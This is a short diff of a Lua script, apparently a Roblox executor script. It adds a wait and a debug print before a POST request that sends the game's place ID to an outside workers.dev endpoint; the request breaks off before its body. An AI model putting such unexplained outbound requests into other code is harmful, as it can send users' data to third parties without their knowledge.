@@ -1,6 +1,10 @@
+local Players = game:GetService("Players")
+
 _G.GameId = game.PlaceId
 local v8 = "https://crimson-firefly-6874.nothingpanel00.workers.dev/"
 
+task.wait(0.1)
+print("url checked")
 local response = request({
     Url = v8,
     Method = "POST",
